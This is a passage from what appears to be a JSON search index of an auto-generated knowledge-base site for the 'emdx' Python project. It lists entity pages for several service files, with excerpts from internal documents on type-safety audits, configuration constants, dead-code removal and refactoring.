\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.9)</li> <li><code>recent_days</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.9)</li> <li><code>confidence indicator</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.9)</li> <li><code>emdx/utils/emoji_aliases.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=4.7)</li> <li><code>filesystemevent</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.7)</li> <li><code>answer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.7)</li> </ul>"},{"location":"entities/emdxservicescascadeservicepy/","title":"emdx/services/cascade_service.py","text":"<p>Type: heading | Mentioned in: 11 documents | First seen: 2026-02-14</p>"},{"location":"entities/emdxservicescascadeservicepy/#documents-11","title":"Documents (11)","text":"<ul> <li>#6418 Type System Audit: Replace Any/None with Concrete Types [3/4] <p><code>_get_document_metadata(...) -&gt; dict[int, dict[str, Any]]</code></p> </li> <li>Location: Line 189</li> <li>Current Type: <code>dict[int, dict[str, Any]]</code></li> <li> <p>Actual Type: <code>dict[int, DocumentMetadata]</code> with: `title: str, content: str | None, project: str | None, access_c...</p> </li> <li> <p>#6530 Delegate: Review GitHub PR #651 using 'gh pr view 651' and 'gh pr diff [2/4]   Section: \u2705 Strengths</p> <p>...commands/cascade.py` (783 lines)</p> </li> <li><code>emdx/database/cascade.py</code> (375 lines)</li> <li><code>emdx/services/cascade_service.py</code> (195 lines)</li> <li><code>emdx/ui/cascade/</code> directory (6 files, ~1,175 lines)</li> <li><code>docs/cascade.md</code> (326 lines)</li> <li> <p>Related tests (~1,408 lines across multiple files)</p> </li> <li> <p>#6469 Centralized Configuration Constants for EMDX   Section: Updated Files</p> </li> <li><code>emdx/services/ask_service.py</code> - Uses DEFAULT_ASK_MODEL</li> <li><code>emdx/services/cascade_service.py</code> - Uses CASCADE_*_TIMEOUT_SECONDS</li> <li><code>emdx/services/claude_executor.py</code> - Uses DEFAULT_CLI_TIMEOUT_SECONDS</li> <li> <p><code>emdx/services/unified_executor.py</code> - Uses DEFAULT_TIMEOU...</p> </li> <li> <p>#6431 Add cascade TypedDicts to database and service layers   Section: Changes Made</p> <p>Updated: <code>emdx/services/cascade_service.py</code></p> </li> <li><code>get_recent_pipeline_activity()</code> \u2192 <code>list[PipelineActivityItem]</code></li> <li> <p><code>get_child_info()</code> \u2192 <code>ChildDocInfo | None</code></p> </li> <li> <p>#6362 Delegate: DEBT-5: Fix silent exception handlers in the emdx codebase.  [2/3]   Section: DEBT-5: Fix Silent Exception Handlers</p> <p>...lookup</p> </li> <li><code>emdx/services/ask_service.py</code> - ValueError on invalid doc ID format</li> <li><code>emdx/services/cascade_service.py</code> - ProcessLookupError on already-exited process</li> <li><code>emdx/ui/activity/activity_data.py</code> - ImportError for optional services</li> <li> <p><code>emdx/ui/activity/activity_items.py</code> -...</p> </li> <li> <p>#6361 Delegate: DEBT-7: Centralize configuration constants in emdx. Currentl [1/2]   Section: 2. Updated files to use centralized constants:</p> File Change <code>emdx/services/cascade_service.py</code> Use STAGE_*_TIMEOUT constants <code>emdx/services/claude_executor.py</code> Use CLI_SYNC_DEFAULT_TIMEOUT <code>emdx/commands/cascade.py</code> Use STAGE_*_TIMEOUT constants... </li> <li> <p>#6355 Delegate: Document #6349 (Service Layer &amp; Cascade Refactor Plan): Implementation Complete   Section: Changes Made</p> </li> <li><code>emdx/services/cascade_service.py</code> (+43 lines)</li> <li> <p><code>emdx/ui/activity/activity_data.py</code> (-24 lines, +15 lines)</p> </li> <li> <p>#6303 Delegate: DEBT-10 RETRY: Fix type safety debt in the emdx project. Foc   Section: Functions with Return Type Annotations</p> <p>emdx/services/cascade_service.py:</p> </li> <li><code>get_recent_pipeline_activity()</code> \u2192 <code>list[PipelineActivityItem]</code></li> <li> <p><code>get_child_info()</code> \u2192 <code>ChildDocInfo | None</code></p> </li> <li> <p>#6284 Delegate: DEBT-7: Centralize configuration   Section: Changes Made</p> <p>...MEOUT_SECONDS</p> </li> <li><code>emdx/services/ask_service.py</code> - Uses DEFAULT_CLAUDE_FAST_MODEL</li> <li><code>emdx/services/cascade_service.py</code> - Uses CASCADE_*_TIMEOUT_SECONDS</li> <li><code>emdx/services/claude_executor.py</code> - Uses DEFAULT_TIMEOUT_SECONDS</li> <li> <p><code>emdx/services/execution_monitor.py</code> - Uses STALE_EXECUTION_T...</p> </li> <li> <p>#6219 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: Critical Issues (8)</p> </li> <li> <p>#6341 Delegate: R4: Centralize configuration constants. Create emdx/constant   Section: Changes Made</p> <p>...S</p> </li> <li>emdx/services/unified_executor.py - Uses DEFAULT_CLI_TIMEOUT_SECONDS</li> <li>emdx/services/cascade_service.py - Uses DEFAULT_CLI_TIMEOUT_SECONDS and IMPLEMENTATION_TIMEOUT_SECONDS</li> <li>emdx/commands/cascade.py - Uses DEFAULT_CLI_TIMEOUT_SECONDS and IMPLEMENTATION_TIMEOUT...</li> </ul>"},{"location":"entities/emdxservicescascadeservicepy/#service-layer","title":"Service Layer","text":""},{"location":"entities/emdxservicescascadeservicepy/#files-modified","title":"Files Modified","text":""},{"location":"entities/emdxservicescascadeservicepy/#8-cascade-service-uses-untyped-dicts","title":"8. Cascade service uses untyped dicts","text":"<p>File: <code>emdx/services/cascade_service.py:30,62,72</code> Issue: Functions return <code>Dict[str, Any]</code> or <code>Dict[str, Any] | None</code> - mixed Optional syntax, no TypedDict Severity: CRITICAL</p>"},{"location":"entities/emdxservicescascadeservicepy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/services/execution_monitor.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.3)</li> <li><code>validate_database_url()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>validate_api_key(raise_on_missing=false)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>timeout constants:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>summary centralized</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>pipelineactivityitem</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>list[pipelineactivityitem]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>implementation_timeout_seconds</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>get_required_env_vars()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>get_optional_env_vars()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> </ul>"},{"location":"entities/emdxservicesclaudeexecutorpy/","title":"emdx/services/claude_executor.py","text":"<p>Type: tech_term | Mentioned in: 17 documents | First seen: 2026-01-11</p>"},{"location":"entities/emdxservicesclaudeexecutorpy/#documents-17","title":"Documents (17)","text":"<ul> <li> <p>#6610 Delegate: Search the entire emdx codebase for every import or referenc [2/2]   Section: Production Code \u2014 UI/Display Emojis (NOT in EMOJI_ALIASES)</p> <p>...| 78, 97, 113, 115, 120, 123, 131, 133, 137 | \ud83d\ude80\ud83d\udee0\ufe0f\ud83d\udd0d\u2705\u274c | Log message formatting | | <code>emdx/services/claude_executor.py</code> | 198, 223 | \u2705 | Background process start message | | <code>emdx/services/health_monitor.py</code> | 689 | \u2728 | No actions needed message | | <code>emdx/utils/claude_wrapper.py</code> | 6...</p> </li> <li> <p>#6600 Delegate: Fix PR #689 on branch delegate/remove-any-remaining-referenc   Section: 7 conflicted files resolved:</p> <p>..._config.py<code>| Kept main's version (already had Cursor removed, correct model) | |</code>emdx/services/claude_executor.py<code>| Kept main + removed remaining Cursor comment reference | |</code>emdx/services/cli_executor/init.py<code>| Kept main's version | |</code>emdx/services/cli_executor/base.py`...</p> </li> <li> <p>#6494 None Type Analysis [5/7]   Section: None Type Analysis: Executor/CLI Service Files</p> <p>...d:</p> </li> <li><code>emdx/services/unified_executor.py</code></li> <li><code>emdx/services/cli_executor/base.py</code></li> <li><code>emdx/services/claude_executor.py</code></li> <li><code>emdx/services/cli_executor/cursor.py</code></li> <li><code>emdx/services/cli_executor/claude.py</code></li> <li> <p><code>emdx/services/cli_executor/factory.py</code></p> </li> <li> <p>#6492 None Type Analysis [5/7]   Section: Conclusion</p> <p>...cessary</p> </li> <li><code>emdx/services/cli_executor/base.py</code> - 4 occurrences, all necessary</li> <li><code>emdx/services/claude_executor.py</code> - 8 occurrences, all necessary</li> <li><code>emdx/services/cli_executor/cursor.py</code> - 6 occurrences, all necessary</li> <li> <p><code>emdx/services/cli_executor/claude.py</code> - 6 occurrences, a...</p> </li> <li> <p>#6469 Centralized Configuration Constants for EMDX   Section: Updated Files</p> <p>...ASK_MODEL</p> </li> <li><code>emdx/services/cascade_service.py</code> - Uses CASCADE_*_TIMEOUT_SECONDS</li> <li><code>emdx/services/claude_executor.py</code> - Uses DEFAULT_CLI_TIMEOUT_SECONDS</li> <li><code>emdx/services/unified_executor.py</code> - Uses DEFAULT_TIMEOUT_SECONDS</li> <li> <p><code>emdx/services/execution_monitor.py</code> - Uses STALE_EXECUTIO...</p> </li> <li> <p>#6393 Delegate: Fix resource leaks in file handles and connections. Task #627   Section: Fix Resource Leaks in File Handles - Task #627</p> </li> <li> <p>#6361 Delegate: DEBT-7: Centralize configuration constants in emdx. Currentl [1/2]   Section: 2. Updated files to use centralized constants:</p> <p>...-------| | <code>emdx/services/cascade_service.py</code> | Use STAGE_TIMEOUT constants | | <code>emdx/services/claude_executor.py</code> | Use CLI_SYNC_DEFAULT_TIMEOUT | | <code>emdx/commands/cascade.py</code> | Use STAGE_TIMEOUT constants | | <code>emdx/services/unified_executor.py</code> | Use CLI_SYNC_DEFAULT_TIMEOUT...</p> </li> <li> <p>#6339 Delegate: R2: Add retry logic for network/IO operations   Section: R2: Add Retry Logic for Network/IO Operations</p> <ul> <li><code>emdx/services/claude_executor.py</code>: Added import for retry module</li> </ul> </li> <li> <p>Note: Claude API calls happen inside the claude CLI binary itself, so we can't wrap those directly. The retry module is available for future use with other API calls.</p> </li> <li> <p>#6284 Delegate: DEBT-7: Centralize configuration   Section: Changes Made</p> <p>...AST_MODEL</p> </li> <li><code>emdx/services/cascade_service.py</code> - Uses CASCADE_*_TIMEOUT_SECONDS</li> <li><code>emdx/services/claude_executor.py</code> - Uses DEFAULT_TIMEOUT_SECONDS</li> <li><code>emdx/services/execution_monitor.py</code> - Uses STALE_EXECUTION_TIMEOUT_SECONDS</li> <li> <p><code>emdx/services/unified_executor.py</code> - Uses DEFAULT_TI...</p> </li> <li> <p>#6275 Delegate: DEBT-6: Remove dead code   Section: Changes Made</p> <p>.../database/cascade.py: removed <code>Optional</code></p> </li> <li>emdx/database/search.py: removed <code>re</code></li> <li>emdx/services/claude_executor.py: removed <code>CliTool</code>, <code>get_cli_config</code>, <code>DEFAULT_CLAUDE_MODEL</code>, <code>validate_execution_environment</code></li> <li>emdx/services/cli_executor/base.py: removed <code>Path</code></li> <li> <p>emdx/services/s...</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 1. UNUSED IMPORTS (High Priority)</p> <p>...arityService`</p> </li> <li><code>emdx/services/ask_service.py:8</code> - unused import: <code>annotations</code></li> <li><code>emdx/services/claude_executor.py:24-26</code> - unused imports: <code>CliTool</code>, <code>get_cli_config</code>, <code>DEFAULT_CLAUDE_MODEL</code>, <code>validate_execution_environment</code></li> <li> <p><code>emdx/services/cli_executor/__init__.py:7-8</code> - unuse...</p> </li> <li> <p>#6227 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: 3. Overly Broad Exception Catches (60+ instances)</p> <p>...ubprocessError<code>,</code>TimeoutExpired`):**</p> </li> <li><code>emdx/services/unified_executor.py:482</code></li> <li><code>emdx/services/claude_executor.py:382</code></li> <li><code>emdx/commands/delegate.py:322,669</code></li> <li><code>emdx/services/cli_executor/claude.py:203</code></li> <li> <p><code>emdx/services/cli_executor/cursor.py:246,264</code></p> </li> <li> <p>#6220 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: \ud83d\udfe1 MEDIUM: Missing Retry Logic for I/O Operations</p> <p>...laude_wrapper.py<code>| 93 | Claude process execution | MEDIUM - Process may hang | |</code>emdx/services/claude_executor.py` | 176, 204, 298 | Subprocess execution | MEDIUM |</p> </li> <li> <p>#4547 Tech Debt Parallel Fix - Tech_Debt_Parallel_Fix Synthesis   Section: Synthesis Log</p> <p>...%s\", e)                 logger.warning(... [00:03:01] \ud83d\udcc4 Tool result: diff --git a/emdx/services/claude_executor.py b/emdx/services/claude_executor.py index 31e7044..80f9... [00:03:01] \ud83d\udcc4 Tool result: diff --git a/emdx/services/document_executor.py b/emdx/services/document_executor...</p> </li> <li> <p>#6585 Delegate: Remove any remaining references to 'cursor' or 'Cursor' in c [2/2]   Section: Files Modified</p> <ol> <li>emdx/services/claude_executor.py \u2014 4 changes</li> </ol> </li> <li>Removed \"Cursor\" from module docstring</li> <li> <p>Updated parameter docstrings to remove <code>\"cursor\"</code> option</p> </li> <li> <p>#6341 Delegate: R4: Centralize configuration constants. Create emdx/constant   Section: Changes Made</p> <p>...emdx/config/cli_config.py* - Uses CLAUDE_OPUS_MODEL and CLAUDE_SONNET_MODEL</p> </li> <li>emdx/services/claude_executor.py - Uses DEFAULT_CLI_TIMEOUT_SECONDS and SUBPROCESS_SHORT_TIMEOUT_SECONDS</li> <li>emdx/services/execution_monitor.py - Uses STALE_EXECUTION_TIMEOUT_SECONDS</li> <li>**emdx/...</li> </ul>"},{"location":"entities/emdxservicesclaudeexecutorpy/#summary","title":"Summary","text":"<p>Fixed resource leaks in <code>emdx/services/claude_executor.py</code> where file handles were opened without context managers.</p>"},{"location":"entities/emdxservicesclaudeexecutorpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/services/cli_executor/factory.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.6)</li> <li><code>vertical</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>validate_database_url()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>validate_api_key(raise_on_missing=false)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>timeout constants:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>summary centralized</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>emdx/services/cli_executor/base.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.4)</li> <li><code>emdx/services/cli_executor/cursor.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.3)</li> <li><code>emdx/services/cli_executor/claude.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.2)</li> <li><code>emdx/services/cli_executor/__init__.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.2)</li> </ul>"},{"location":"entities/emdxservicessynthesisservicepy/","title":"emdx/services/synthesis_service.py","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-02-15</p>"},{"location":"entities/emdxservicessynthesisservicepy/#documents-10","title":"Documents (10)","text":"<ul> <li>#6476 EMDX Knowledge Base Enhancement: Complete Implementation Guide   Section: Implementation Components </li> <li>Shared service using Claude Opus API</li> <li>Methods: <code>synthesize_documents()</code>, <code>estimate_cost()</code>, <code>_fetch_documents()</code></li> <li> <p>Import guards for optional <code>anthropic</code> depend...</p> </li> <li> <p>#6467 emdx distill Command Implementation   Section: Core Components</p> <p>1. SynthesisService (<code>emdx/services/synthesis_service.py</code>)</p> </li> <li>Main service class for AI-powered document synthesis using Claude API</li> <li> <p><code>SynthesisResult</code> dataclass tracks synthesis output, source IDs, token usage, and model u...</p> </li> <li> <p>#6451 Implement emdx distill command   Section: Summary</p> <ol> <li><code>emdx/services/synthesis_service.py</code> - SynthesisService with Claude Opus API integration for AI-powered document synthesis. Includes:</li> </ol> </li> <li><code>SynthesisResult</code> dataclass</li> <li> <p>Audience-aware prompts (me/...</p> </li> <li> <p>#6449 Implement emdx compact command   Section: Implementation Complete</p> </li> <li><code>emdx/services/synthesis_service.py</code> - Shared service for AI-powered document synthesis using Claude Opus API</li> <li> <p><code>emdx/commands/compact.py</code> - CLI command with TF-IDF clustering (free discovery) a...</p> </li> <li> <p>#6448 Implement emdx compact command   Section: Components Created</p> </li> <li>Shared service using Claude Opus API for document synthesis</li> <li>Methods:</li> <li><code>synthesize_documents(doc_ids, purpose)</code> - Main synthesis method</li> <li> <p>`estimate_cost(do...</p> </li> <li> <p>#6447 Implement emdx distill command   Section: Summary</p> <ol> <li>SynthesisService (<code>emdx/services/synthesis_service.py</code>) \u2014 AI-powered document synthesis using Claude Sonnet API with audience-aware prompts</li> </ol> </li> <li> <p>#6368 Gameplans: compact, distill, and draft-pr [synthesis]   Section: 1. <code>emdx compact</code> Command</p> <p>New Files:</p> </li> <li><code>emdx/services/synthesis_service.py</code> \u2014 Shared synthesis logic</li> <li><code>emdx/commands/compact.py</code> \u2014 CLI implementation</li> <li> <p><code>tests/test_compact.py</code> \u2014 Test suite</p> </li> <li> <p>#6367 Gameplan: emdx compact \u2014 AI-Powered KB Synthesis   Section: Key Files</p> File Action Description <code>emdx/services/synthesis_service.py</code> NEW Shared synthesis logic for compact + distill <code>emdx/commands/compact.py</code> NEW CLI command implementation <code>emdx/services/document_merger.py</code> EXTE... </li> <li> <p>#6366 Gameplan: emdx distill \u2014 Synthesize KB Content for Sharing   Section: Key Files</p> File Purpose <code>emdx/commands/distill.py</code> NEW \u2014 CLI command <code>emdx/services/synthesis_service.py</code> NEW \u2014 Shared synthesis logic <code>emdx/prompts/distill/</code> NEW \u2014 Audience prompt templates </li> <li> <p>#6446 Implement emdx distill command   Section: Files Created/Modified</p> </li> <li>emdx/services/synthesis_service.py</li> <li><code>SynthesisService</code> class for AI-powered document synthesis</li> <li><code>Audience</code> enum with three modes: <code>ME</code>, <code>DOCS</code>, <code>COWORKERS</code></li> <li><code>SynthesisResult</code> dataclass f...</li> </ul>"},{"location":"entities/emdxservicessynthesisservicepy/#synthesisservice-emdxservicessynthesis_servicepy","title":"SynthesisService (<code>emdx/services/synthesis_service.py</code>)","text":""},{"location":"entities/emdxservicessynthesisservicepy/#files-created","title":"Files Created","text":""},{"location":"entities/emdxservicessynthesisservicepy/#1-synthesisservice-emdxservicessynthesis_servicepy","title":"1. SynthesisService (<code>emdx/services/synthesis_service.py</code>)","text":""},{"location":"entities/emdxservicessynthesisservicepy/#new-files","title":"New Files","text":""},{"location":"entities/emdxservicessynthesisservicepy/#related-entities","title":"Related Entities","text":"<ul> <li><code>tests/test_distill.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.4)</li> <li><code>synthesis layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>future extensions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>emdx compact --schedule weekly</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>discovery layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>archive layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>synthesis (opus api)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>required extras</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>quality checks passed</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>new files</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> </ul>"},{"location":"entities/emdxservicestypespy/","title":"emdx/services/types.py","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-16</p>"},{"location":"entities/emdxservicestypespy/#documents-8","title":"Documents (8)","text":"<ul> <li>#6605 Delegate: Fix PR #687: Add ExecutionResultDict TypedDict for Execution   Section: Changes Made </li> <li>Added <code>ExecutionResultDict</code> TypedDict in a new \"Unified Executor types\" section at the end of the file</li> <li> <p>13 fields matching <code>ExecutionResult.to_dict()</code>: <code>success</code>...</p> </li> <li> <p>#6583 Delegate synthesis [synthesis]   Section: New TypedDicts to Create</p> <p>Add to <code>emdx/services/types.py</code>:</p> </li> <li><code>SynthesisInputDocument</code> (id, title, content)</li> <li><code>CostEstimate</code> (input_tokens, output_tokens, estimated_cost)</li> <li> <p><code>TaskSyncResult</code> (success, output?, error?, exit_code?) \u2014 <code>total=False</code></p> </li> <li> <p>#6579 Delegate: Add a TypedDict for the dict returned by ExecutionResult.to_   Section: Changes</p> <p>Added <code>ExecutionResultDict</code> TypedDict to <code>emdx/services/types.py</code> and annotated the return type of <code>ExecutionResult.to_dict()</code> in <code>emdx/services/unified_executor.py</code>.</p> </li> <li> <p>#6577 Delegate: Audit emdx/services/ for functions that still return dict[str, Any] [1/3]   Section: Recommended TypedDicts to create</p> <p>Add to <code>emdx/services/types.py</code>:</p> </li> </ul>"},{"location":"entities/emdxservicestypespy/#emdxservicestypespy_1","title":"<code>emdx/services/types.py</code>","text":""},{"location":"entities/emdxservicestypespy/#related-entities","title":"Related Entities","text":"<ul> <li><code>execution_time_ms</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.7)</li> <li><code>unified executor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.7)</li> <li><code>`emdx/services/types.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.7)</li> <li><code>.types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.7)</li> <li><code>unified_executor.py:192</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>synthesisinputdocument</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>synthesis_service.py:390</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>synthesis_service.py:223</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>synthesis_service.py:140</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>execute_task_sync()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> </ul>"},{"location":"entities/emdxservicesunifiedexecutorpy/","title":"emdx/services/unified_executor.py","text":"<p>Type: heading | Mentioned in: 26 documents | First seen: 2026-02-13</p>"},{"location":"entities/emdxservicesunifiedexecutorpy/#documents-26","title":"Documents (26)","text":"<ul> <li>#6418 Type System Audit: Replace Any/None with Concrete Types [3/4] <p><code>get_execution_metrics() -&gt; dict[str, Any]</code></p> </li> <li>Location: Line 163</li> <li>Current Type: <code>dict[str, Any]</code></li> <li> <p>Actual Type: Create TypedDict <code>ExecutionMetrics</code> with: `total_executions: int, status_breakdown: dict[str, int], recent_24h: dict[str, int...</p> </li> <li> <p>#6610 Delegate: Search the entire emdx codebase for every import or referenc [2/2]   Section: Production Code \u2014 UI/Display Emojis (NOT in EMOJI_ALIASES)</p> File Lines Emojis Purpose <code>emdx/services/unified_executor.py</code> 44-55 \ud83d\udcd6\ud83d\udcdd\u270f\ufe0f\ud83d\udcbb\ud83d\udd0d\ud83d\udd0e\ud83d\udcc2\ud83d\udccb\u2705\ud83c\udf10 <code>TOOL_EMOJIS</code> dict for log formatting <code>emdx/services/unified_executor.py</code> 78, 97, 113, 115, 120, 123, 131, 133, 137 \ud83d\ude80\ud83d\udee0\ufe0f\ud83d\udd0d\u2705\u274c Log mes... </li> <li> <p>#6605 Delegate: Fix PR #687: Add ExecutionResultDict TypedDict for Execution   Section: Changes Made</p> </li> <li>Imported <code>ExecutionResultDict</code> from <code>.types</code></li> <li>Changed <code>to_dict()</code> return type from <code>dict[str, Any]</code> to <code>ExecutionResultDict</code></li> <li> <p><code>Any</code> import preserved (still used...</p> </li> <li> <p>#6600 Delegate: Fix PR #689 on branch delegate/remove-any-remaining-referenc   Section: 7 conflicted files resolved:</p> <p>...n's version | | <code>emdx/services/cli_executor/factory.py</code> | Kept main's version | | <code>emdx/services/unified_executor.py</code> | Kept main + removed remaining Cursor comment reference | | <code>emdx/utils/environment.py</code> | Kept main's version |</p> </li> <li> <p>#6579 Delegate: Add a TypedDict for the dict returned by ExecutionResult.to_   Section: Changes</p> <p>Added <code>ExecutionResultDict</code> TypedDict to <code>emdx/services/types.py</code> and annotated the return type of <code>ExecutionResult.to_dict()</code> in <code>emdx/services/unified_executor.py</code>.</p> </li> <li> <p>#6566 Delegate: Review the UnifiedExecutor in emdx/services/unified_executor [2/3]   